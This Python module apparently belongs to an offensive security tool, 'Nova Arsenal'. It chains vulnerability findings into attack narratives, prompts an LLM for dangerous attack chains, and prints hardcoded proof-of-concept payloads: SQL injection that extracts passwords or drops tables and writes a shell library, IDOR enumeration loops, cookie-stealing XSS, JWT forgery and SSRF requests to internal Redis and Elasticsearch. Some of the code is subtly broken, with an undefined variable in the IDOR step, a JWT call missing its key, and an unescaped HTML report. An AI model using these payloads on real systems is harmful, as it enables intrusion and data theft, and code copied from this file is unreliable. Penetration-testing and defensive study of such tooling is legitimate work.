"""
Nova Chain Reasoner v1.0
========================
Analyzes multiple findings and generates sophisticated vulnerability chains.
Reasons about how vulnerabilities can be chained together for maximum impact.

This is the "Claude-level reasoning" component of Nova Arsenal.
It takes discrete findings and builds attack narratives.
"""

import json
import re
from typing import List, Dict, Any, Tuple, Optional
from dataclasses import dataclass, field
from enum import Enum
import logging

logger = logging.getLogger(__name__)


class ChainType(Enum):
    """Types of vulnerability chains"""
    AUTHENTICATION_BYPASS = "authentication_bypass"  # Auth bypass → Admin access
    DATA_EXFILTRATION = "data_exfiltration"  # IDOR + secret → Data theft
    REMOTE_CODE_EXECUTION = "remote_code_execution"  # SQLi/SSRF/LLMi → RCE
    PRIVILEGE_ESCALATION = "privilege_escalation"  # User vuln → Admin access
    LATERAL_MOVEMENT = "lateral_movement"  # Initial access → Internal system compromise
    DENIAL_OF_SERVICE = "denial_of_service"  # Race condition + business logic → DoS
    SUPPLY_CHAIN_ATTACK = "supply_chain"  # CVE deps + deployment → Compromise
    ZERO_DAY_CORRELATOR = "zero_day"  # Multiple unknown → Novel attack


@dataclass
class Finding:
    """Parsed vulnerability finding"""
    id: str
    type: str  # SQLi, XSS, IDOR, SSRF, JWT, etc.
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    endpoint: str
    parameter: str
    payload_example: Optional[str] = None
    confidence: float = 0.0  # 0-1, how verified
    context: Dict[str, Any] = field(default_factory=dict)


@dataclass
class VulnerabilityChain:
    """Complete chain from initial access to impact"""
    chain_id: str
    chain_type: ChainType
    severity: str
    findings: List[Finding]
    narrative: str  # Human-readable exploit description
    steps: List[str]  # Step-by-step exploitation
    impact: str  # What attacker can do
    cvss_score: float  # Estimated impact
    proof_of_concept: str  # PoC code/description
    confidence: float  # 0-1, likelihood chain works
    mitigations: List[str]  # How to fix


class ChainReasoner:
    """
    Analyzes findings and generates vulnerability chains.
    Uses LLM reasoning for sophisticated analysis.
    """

    # Chain templates: [finding_type] → [finding_type] = [impact]
    CHAIN_PATTERNS = {
        ("jwt_vulnerability", "api_endpoint"): {
            "name": "Forged JWT → Unauthorized API Access",
            "chain_type": ChainType.AUTHENTICATION_BYPASS,
            "severity": "CRITICAL",
            "reasoning": "If JWT is vulnerable (alg:none, weak key), attacker can forge tokens and access API as any user"
        },
        ("sql_injection", "database_backed_endpoint"): {
            "name": "SQLi → Data Exfiltration",
            "chain_type": ChainType.DATA_EXFILTRATION,
            "severity": "CRITICAL",
            "reasoning": "SQL injection on database-backed endpoint allows direct database queries, exfiltrating all data"
        },
        ("idor", "secret_exposure"): {
            "name": "IDOR + Exposed Secret → Account Takeover",
            "chain_type": ChainType.AUTHENTICATION_BYPASS,
            "severity": "CRITICAL",
            "reasoning": "IDOR allows accessing other users' data; if that data includes secrets/tokens, attacker takes over accounts"
        },
        ("ssrf", "internal_service"): {
            "name": "SSRF → Internal Service Compromise",
            "chain_type": ChainType.LATERAL_MOVEMENT,
            "severity": "CRITICAL",
            "reasoning": "SSRF can reach internal services (Redis, Elasticsearch, databases) and execute queries/commands"
        },
        ("ssrf", "rce_vulnerability"): {
            "name": "SSRF Chaining to RCE",
            "chain_type": ChainType.REMOTE_CODE_EXECUTION,
            "severity": "CRITICAL",
            "reasoning": "SSRF reaches internal RCE vector (Gogs, Jenkins, etc.) and executes commands on internal systems"
        },
        ("xss", "session_token"): {
            "name": "XSS + Session Stealing",
            "chain_type": ChainType.AUTHENTICATION_BYPASS,
            "severity": "HIGH",
            "reasoning": "XSS injects JavaScript to steal session cookies, allowing account takeover"
        },
        ("race_condition", "database_state"): {
            "name": "Race Condition → Duplicate Purchase/Bonus",
            "chain_type": ChainType.DENIAL_OF_SERVICE,
            "severity": "HIGH",
            "reasoning": "Race condition in payment/inventory logic allows duplicate transactions or unlimited bonuses"
        },
        ("cve_dependency", "deployment"): {
            "name": "Known CVE in Dependency → RCE",
            "chain_type": ChainType.SUPPLY_CHAIN_ATTACK,
            "severity": "CRITICAL",
            "reasoning": "If app uses vulnerable library version and calls vulnerable function, exploit applies directly"
        },
        ("llm_injection", "api_integration"): {
            "name": "LLM Injection → Prompt Injection → Data Leakage",
            "chain_type": ChainType.DATA_EXFILTRATION,
            "severity": "HIGH",
            "reasoning": "User input reaches LLM without sanitization; attacker injects prompt to extract system info or user data"
        },
        ("business_logic", "payment_system"): {
            "name": "Price Manipulation → Fraud",
            "chain_type": ChainType.DENIAL_OF_SERVICE,
            "severity": "HIGH",
            "reasoning": "Business logic flaw allows modifying prices before checkout, purchasing premium items for $0.01"
        }
    }

    def __init__(self, llm_router=None, verify_engine=None):
        """
        Args:
            llm_router: LLM provider for reasoning (optional, has fallback logic)
            verify_engine: Verification engine to confirm chains (optional)
        """
        self.llm_router = llm_router
        self.verify_engine = verify_engine
        self.chains = []

    def analyze_findings(self, findings: List[Dict[str, Any]]) -> List[VulnerabilityChain]:
        """
        Main entry point: analyze all findings and generate chains.
        
        Args:
            findings: List of finding dicts from scanners
            
        Returns:
            List of vulnerability chains ranked by severity/impact
        """
        logger.info(f"Analyzing {len(findings)} findings for chains...")
        
        # Parse findings
        parsed_findings = [self._parse_finding(f) for f in findings]
        
        # Generate chains using multiple strategies
        chains = []
        chains.extend(self._template_based_chains(parsed_findings))
        chains.extend(self._similarity_based_chains(parsed_findings))
        if self.llm_router:
            chains.extend(self._llm_reasoning_chains(parsed_findings))
        
        # Rank by impact
        chains = sorted(chains, key=lambda c: self._score_chain(c), reverse=True)
        
        self.chains = chains
        logger.info(f"Generated {len(chains)} chains")
        return chains

    def _parse_finding(self, finding_dict: Dict) -> Finding:
        """Convert raw finding to Finding object"""
        return Finding(
            id=finding_dict.get("id", "unknown"),
            type=finding_dict.get("type", "unknown"),
            severity=finding_dict.get("severity", "MEDIUM"),
            endpoint=finding_dict.get("endpoint", ""),
            parameter=finding_dict.get("parameter", ""),
            payload_example=finding_dict.get("payload", None),
            confidence=finding_dict.get("confidence", 0.5),
            context=finding_dict.get("context", {})
        )

    def _template_based_chains(self, findings: List[Finding]) -> List[VulnerabilityChain]:
        """
        Use predefined chain patterns to find common chains.
        Fast, reliable, but limited to known patterns.
        """
        chains = []
        
        # Build a map: vulnerability_type -> findings
        vuln_map = {}
        for finding in findings:
            if finding.type not in vuln_map:
                vuln_map[finding.type] = []
            vuln_map[finding.type].append(finding)
        
        # Check each pattern
        for (vuln_type_1, vuln_type_2), pattern in self.CHAIN_PATTERNS.items():
            if vuln_type_1 in vuln_map and vuln_type_2 in vuln_map:
                for finding_1 in vuln_map[vuln_type_1]:
                    for finding_2 in vuln_map[vuln_type_2]:
                        chain = self._build_chain(
                            [finding_1, finding_2],
                            pattern["name"],
                            pattern["chain_type"],
                            pattern["severity"],
                            pattern["reasoning"]
                        )
                        chains.append(chain)
        
        return chains

    def _similarity_based_chains(self, findings: List[Finding]) -> List[VulnerabilityChain]:
        """
        Find chains based on semantic similarity: same endpoint, related types.
        E.g., XSS + Session token on same endpoint = session stealing
        """
        chains = []
        
        # Group findings by endpoint
        endpoint_map = {}
        for finding in findings:
            endpoint = finding.endpoint or "unknown"
            if endpoint not in endpoint_map:
                endpoint_map[endpoint] = []
            endpoint_map[endpoint].append(finding)
        
        # Look for chaining opportunities on same endpoint
        for endpoint, findings_here in endpoint_map.items():
            if len(findings_here) >= 2:
                for i, f1 in enumerate(findings_here):
                    for f2 in findings_here[i+1:]:
                        chain = self._reason_chain_similarity(f1, f2, endpoint)
                        if chain:
                            chains.append(chain)
        
        return chains

    def _llm_reasoning_chains(self, findings: List[Finding]) -> List[VulnerabilityChain]:
        """
        Use LLM to reason about sophisticated chains.
        Slower but can find novel combinations.
        """
        chains = []
        
        if not self.llm_router:
            return chains
        
        # Build context about all findings
        findings_summary = self._summarize_findings(findings)
        
        prompt = f"""
You are a sophisticated security researcher analyzing vulnerability chains.

FINDINGS DISCOVERED:
{findings_summary}

TASK: Identify 3-5 of the most dangerous vulnerability chains that could be exploited in sequence.

For each chain, provide:
1. Chain name (e.g., "SQLi → Data Exfiltration → API Key Theft")
2. Attack steps (numbered, concrete)
3. Why this chain works (reasoning)
4. What an attacker gains
5. CVSS score estimate

Focus on:
- Chains that escalate privilege or access
- Combinations that bypass authentication
- Attacks that lead to data theft or RCE
- Novel chains not in standard lists

Output as JSON array with keys: name, steps, reasoning, impact, cvss_score
"""
        
        try:
            response = self.llm_router.reason(prompt, max_tokens=2000)
            chains_json = self._extract_json(response)
            
            for chain_data in chains_json:
                chain = self._build_chain_from_llm(findings, chain_data)
                if chain:
                    chains.append(chain)
        except Exception as e:
            logger.error(f"LLM reasoning failed: {e}")
        
        return chains

    def _reason_chain_similarity(self, f1: Finding, f2: Finding, endpoint: str) -> Optional[VulnerabilityChain]:
        """Reason about how two findings on the same endpoint chain"""
        
        # XSS + Session token = session stealing
        if (f1.type == "xss" and "session" in f2.type.lower()) or \
           (f2.type == "xss" and "session" in f1.type.lower()):
            return self._build_chain(
                [f1, f2],
                f"XSS on {endpoint} + Session Theft",
                ChainType.AUTHENTICATION_BYPASS,
                "HIGH",
                "XSS injection can steal session cookies via JavaScript, allowing account takeover"
            )
        
        # IDOR + Admin endpoint = privilege escalation
        if f1.type == "idor" and "admin" in f2.parameter.lower():
            return self._build_chain(
                [f1, f2],
                f"IDOR + Admin Access",
                ChainType.PRIVILEGE_ESCALATION,
                "CRITICAL",
                "IDOR on user endpoint can enumerate/access admin resources if IDs overlap"
            )
        
        # SQLi + Database endpoint = data exfiltration
        if f1.type == "sql_injection" and ("database" in f2.context or f2.type == "database_query"):
            return self._build_chain(
                [f1, f2],
                f"SQLi → Database Exfiltration",
                ChainType.DATA_EXFILTRATION,
                "CRITICAL",
                "SQL injection allows arbitrary database queries, exfiltrating all data"
            )
        
        return None

    def _build_chain(
        self,
        findings: List[Finding],
        name: str,
        chain_type: ChainType,
        severity: str,
        reasoning: str
    ) -> VulnerabilityChain:
        """Build a VulnerabilityChain from components"""
        
        chain_id = f"chain_{len(self.chains)}_{findings[0].id}_{findings[-1].id}"
        
        # Build attack narrative
        narrative = f"{name}\n\nReasoning: {reasoning}\n\nFindings involved: {', '.join(f.type for f in findings)}"
        
        # Generate steps
        steps = self._generate_steps(findings, chain_type)
        
        # Estimate impact
        impact = self._estimate_impact(chain_type, findings)
        
        # Generate PoC
        poc = self._generate_poc(findings, chain_type)
        
        # Estimate CVSS
        cvss = self._estimate_cvss(severity, chain_type, len(findings))
        
        # Confidence: higher if verified, lower if speculative
        confidence = sum(f.confidence for f in findings) / len(findings)
        
        return VulnerabilityChain(
            chain_id=chain_id,
            chain_type=chain_type,
            severity=severity,
            findings=findings,
            narrative=narrative,
            steps=steps,
            impact=impact,
            cvss_score=cvss,
            proof_of_concept=poc,
            confidence=confidence,
            mitigations=self._suggest_mitigations(findings)
        )

    def _generate_steps(self, findings: List[Finding], chain_type: ChainType) -> List[str]:
        """Generate step-by-step attack instructions"""
        
        steps = ["RECONNAISSANCE"]
        
        for i, finding in enumerate(findings):
            if finding.type == "sql_injection":
                steps.append(f"Step {i+1}: Exploit SQLi on {finding.endpoint} parameter '{finding.parameter}'")
                steps.append(f"  → Use payload: {finding.payload_example or 'UNION-based extraction'}")
                steps.append(f"  → Extract database schema and contents")
            
            elif finding.type == "idor":
                steps.append(f"Step {i+1}: Enumerate user IDs on {finding.endpoint}")
                steps.append(f"  → Request /api/user/{user_id} with sequential IDs")
                steps.append(f"  → Collect data for all accessible users")
            
            elif finding.type == "xss":
                steps.append(f"Step {i+1}: Inject XSS payload on {finding.endpoint}")
                steps.append(f"  → Payload: <script>fetch('/api/steal?data='+document.cookie)</script>")
                steps.append(f"  → Steal session tokens")
            
            elif finding.type == "ssrf":
                steps.append(f"Step {i+1}: SSRF on {finding.endpoint} to reach internal services")
                steps.append(f"  → Target: http://localhost:6379 (Redis), 9200 (Elasticsearch), etc.")
                steps.append(f"  → Query internal services")
            
            elif finding.type == "jwt_vulnerability":
                steps.append(f"Step {i+1}: Forge JWT tokens")
                steps.append(f"  → Use alg:none or weak secret")
                steps.append(f"  → Create admin tokens")
            
            else:
                steps.append(f"Step {i+1}: Exploit {finding.type} on {finding.endpoint}")
        
        steps.append("OBJECTIVE ACHIEVED")
        return steps

    def _estimate_impact(self, chain_type: ChainType, findings: List[Finding]) -> str:
        """Describe what attacker can do with this chain"""
        
        impacts = {
            ChainType.REMOTE_CODE_EXECUTION: "Execute arbitrary code on the server, full system compromise",
            ChainType.AUTHENTICATION_BYPASS: "Access the application as any user, including admin accounts",
            ChainType.DATA_EXFILTRATION: "Steal all sensitive data: PII, secrets, financial records, proprietary info",
            ChainType.PRIVILEGE_ESCALATION: "Promote to admin, access all features and data",
            ChainType.LATERAL_MOVEMENT: "Compromise internal systems (databases, cache, messaging queues)",
            ChainType.DENIAL_OF_SERVICE: "Disrupt service availability, cause financial loss",
            ChainType.SUPPLY_CHAIN_ATTACK: "Inject malicious code into dependencies, compromise all users",
            ChainType.ZERO_DAY_CORRELATOR: "Exploit novel combination of vulnerabilities unknown to defenders"
        }
        
        base_impact = impacts.get(chain_type, "Security compromise")
        multiplier = f"Multiplied across {len(findings)} chained vulnerabilities"
        
        return f"{base_impact}. {multiplier}."

    def _generate_poc(self, findings: List[Finding], chain_type: ChainType) -> str:
        """Generate proof-of-concept code/description"""
        
        if chain_type == ChainType.REMOTE_CODE_EXECUTION:
            return """
# SQLi → RCE via stacked queries
curl 'http://target.com/search?q=test' \\
  --data "q=1; DROP TABLE users; SELECT INTO OUTFILE..."

# Or via UDF loading (MySQL)
SELECT 'malicious' INTO OUTFILE '/usr/lib/mysql/plugin/shell.so'
"""
        
        elif chain_type == ChainType.DATA_EXFILTRATION:
            return """
# IDOR enumeration
for i in {1..10000}; do
  curl -s "http://target.com/api/user/$i" | grep -o '"email":"[^"]*"'
done

# Or SQLi extraction
curl 'http://target.com/search?q=1 UNION SELECT email,password FROM users'
"""
        
        elif chain_type == ChainType.AUTHENTICATION_BYPASS:
            return """
# JWT token forgery
import jwt
token = jwt.encode({"user_id": 1, "role": "admin"}, algorithm="HS256")

# Or XSS to steal session
<img src=x onerror="fetch('/api/steal?cookie='+document.cookie)">
"""
        
        elif chain_type == ChainType.LATERAL_MOVEMENT:
            return """
# SSRF to Redis
curl 'http://target.com/api?url=http://redis:6379/&cmd=KEYS%20*'

# Or SSRF to Elasticsearch
curl 'http://target.com/fetch?url=http://elasticsearch:9200/_all/_search'
"""
        
        else:
            return f"See steps above for {chain_type.name} exploitation"

    def _estimate_cvss(self, severity: str, chain_type: ChainType, num_findings: int) -> float:
        """Estimate CVSS score based on chain characteristics"""
        
        base_scores = {
            "CRITICAL": 9.0,
            "HIGH": 7.5,
            "MEDIUM": 5.5,
            "LOW": 3.5
        }
        
        score = base_scores.get(severity, 5.0)
        
        # Bonus for complexity (more findings = more complex = potentially higher score)
        complexity_bonus = min(num_findings * 0.3, 1.0)
        score = min(score + complexity_bonus, 10.0)
        
        # Type-specific scoring
        if chain_type == ChainType.REMOTE_CODE_EXECUTION:
            score = min(score, 10.0)  # Max out at 10
        elif chain_type == ChainType.AUTHENTICATION_BYPASS:
            score = min(score, 9.5)
        
        return round(score, 1)

    def _suggest_mitigations(self, findings: List[Finding]) -> List[str]:
        """Suggest how to fix the chain"""
        
        mitigations = []
        
        for finding in findings:
            if finding.type == "sql_injection":
                mitigations.append("Use parameterized queries / prepared statements")
                mitigations.append("Implement input validation and sanitization")
                mitigations.append("Apply principle of least privilege to database user")
            
            elif finding.type == "xss":
                mitigations.append("HTML-encode all user input in responses")
                mitigations.append("Implement Content Security Policy (CSP)")
                mitigations.append("Use httpOnly flag on session cookies")
            
            elif finding.type == "idor":
                mitigations.append("Implement proper authorization checks on all object access")
                mitigations.append("Use UUIDs instead of sequential IDs")
                mitigations.append("Verify user owns the resource they're accessing")
            
            elif finding.type == "ssrf":
                mitigations.append("Whitelist allowed URLs, block private IP ranges")
                mitigations.append("Disable DNS rebinding with DNS pinning")
                mitigations.append("Implement egress filtering")
            
            elif finding.type == "jwt_vulnerability":
                mitigations.append("Use strong, randomly generated secrets")
                mitigations.append("Enforce algorithm (don't allow 'none' or 'alg' switching)")
                mitigations.append("Implement token expiration")
            
            elif finding.type == "cve_dependency":
                mitigations.append(f"Update to patched version of dependency")
                mitigations.append("Monitor for security updates regularly")
                mitigations.append("Consider using Software Composition Analysis (SCA) tools")
        
        # Add chain-level mitigations
        mitigations.append("Implement defense-in-depth: multiple layers of security")
        mitigations.append("Use Web Application Firewall (WAF) to block known attacks")
        mitigations.append("Enable detailed logging and alerting for all findings")
        
        return list(set(mitigations))  # Remove duplicates

    def _summarize_findings(self, findings: List[Finding]) -> str:
        """Create a summary of all findings for LLM reasoning"""
        summary = ""
        for f in findings:
            summary += f"- {f.type.upper()} on {f.endpoint}\n"
            summary += f"  Parameter: {f.parameter}\n"
            summary += f"  Severity: {f.severity}\n"
            summary += f"  Confidence: {f.confidence:.0%}\n\n"
        return summary

    def _extract_json(self, text: str) -> list:
        """Extract JSON array from LLM response"""
        try:
            # Try direct JSON parse
            return json.loads(text)
        except:
            # Try to find JSON in response
            match = re.search(r'\[.*\]', text, re.DOTALL)
            if match:
                return json.loads(match.group())
        return []

    def _build_chain_from_llm(self, all_findings: List[Finding], chain_data: Dict) -> Optional[VulnerabilityChain]:
        """Build a chain from LLM reasoning output"""
        try:
            # Match findings to chain
            chain_findings = []
            for finding in all_findings:
                if finding.type.lower() in chain_data.get("name", "").lower():
                    chain_findings.append(finding)
            
            if not chain_findings:
                return None
            
            return VulnerabilityChain(
                chain_id=f"llm_chain_{hash(chain_data.get('name', ''))}",
                chain_type=ChainType.ZERO_DAY_CORRELATOR,
                severity="CRITICAL" if chain_data.get("cvss_score", 0) >= 9 else "HIGH",
                findings=chain_findings,
                narrative=chain_data.get("name", "Unknown chain"),
                steps=chain_data.get("steps", []),
                impact=chain_data.get("impact", "Security compromise"),
                cvss_score=float(chain_data.get("cvss_score", 7.5)),
                proof_of_concept=chain_data.get("poc", "See steps above"),
                confidence=0.75,
                mitigations=self._suggest_mitigations(chain_findings)
            )
        except Exception as e:
            logger.error(f"Failed to build chain from LLM: {e}")
            return None

    def _score_chain(self, chain: VulnerabilityChain) -> float:
        """Score a chain for ranking"""
        severity_weights = {"CRITICAL": 10, "HIGH": 7, "MEDIUM": 4, "LOW": 1}
        
        severity_score = severity_weights.get(chain.severity, 5)
        complexity_score = len(chain.findings) * 2  # More findings = more critical
        confidence_score = chain.confidence * 5
        
        return severity_score + complexity_score + confidence_score

    def export_chains_json(self) -> str:
        """Export all chains as JSON"""
        chains_data = []
        for chain in self.chains:
            chains_data.append({
                "id": chain.chain_id,
                "type": chain.chain_type.value,
                "severity": chain.severity,
                "name": chain.narrative.split("\n")[0],
                "findings": [{"type": f.type, "endpoint": f.endpoint, "parameter": f.parameter} for f in chain.findings],
                "steps": chain.steps,
                "impact": chain.impact,
                "cvss_score": chain.cvss_score,
                "confidence": chain.confidence,
                "mitigations": chain.mitigations
            })
        return json.dumps(chains_data, indent=2)

    def export_chains_html(self) -> str:
        """Export all chains as interactive HTML report"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>Nova Arsenal - Vulnerability Chain Analysis</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #f5f5f5; }
        .chain { background: white; margin: 10px 0; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .critical { border-left: 5px solid #d32f2f; }
        .high { border-left: 5px solid #f57c00; }
        .medium { border-left: 5px solid #fbc02d; }
        .low { border-left: 5px solid #388e3c; }
        .step { margin: 10px 0; padding: 10px; background: #f9f9f9; border-left: 3px solid #2196f3; }
        .poc { background: #263238; color: #aed581; padding: 10px; font-family: monospace; overflow-x: auto; margin: 10px 0; }
        h2 { margin-top: 0; color: #333; }
        .score { font-size: 24px; font-weight: bold; color: #d32f2f; }
    </style>
</head>
<body>
<h1>🦅 Nova Arsenal - Vulnerability Chain Analysis</h1>
"""
        
        for chain in self.chains:
            severity_class = chain.severity.lower()
            html += f"""
<div class="chain {severity_class}">
    <h2>{chain.narrative.split(chr(10))[0]}</h2>
    <p><strong>CVSS Score:</strong> <span class="score">{chain.cvss_score}</span> | 
       <strong>Type:</strong> {chain.chain_type.value} | 
       <strong>Confidence:</strong> {chain.confidence:.0%}</p>
    
    <h3>Attack Steps:</h3>
"""
            for i, step in enumerate(chain.steps, 1):
                html += f'<div class="step">{i}. {step}</div>\n'
            
            html += f"""
    <h3>Impact:</h3>
    <p>{chain.impact}</p>
    
    <h3>Proof of Concept:</h3>
    <pre class="poc">{chain.proof_of_concept}</pre>
    
    <h3>Mitigations:</h3>
    <ul>
"""
            for mitigation in chain.mitigations:
                html += f"<li>{mitigation}</li>\n"
            
            html += """
    </ul>
</div>
"""
        
        html += """
</body>
</html>
"""
        return html


# Example usage
if __name__ == "__main__":
    # Sample findings
    sample_findings = [
        {
            "id": "finding_001",
            "type": "sql_injection",
            "severity": "CRITICAL",
            "endpoint": "GET /api/search",
            "parameter": "q",
            "payload": "1' UNION SELECT username,password FROM users--",
            "confidence": 0.95
        },
        {
            "id": "finding_002",
            "type": "idor",
            "severity": "HIGH",
            "endpoint": "GET /api/user/{id}",
            "parameter": "id",
            "confidence": 0.85
        },
        {
            "id": "finding_003",
            "type": "xss",
            "severity": "MEDIUM",
            "endpoint": "GET /profile",
            "parameter": "bio",
            "confidence": 0.80
        }
    ]
    
    reasoner = ChainReasoner()
    chains = reasoner.analyze_findings(sample_findings)
    
    print(f"Found {len(chains)} vulnerability chains:\n")
    for chain in chains:
        print(f"[{chain.severity}] {chain.narrative}")
        print(f"  CVSS: {chain.cvss_score} | Confidence: {chain.confidence:.0%}")
        print(f"  Impact: {chain.impact}\n")
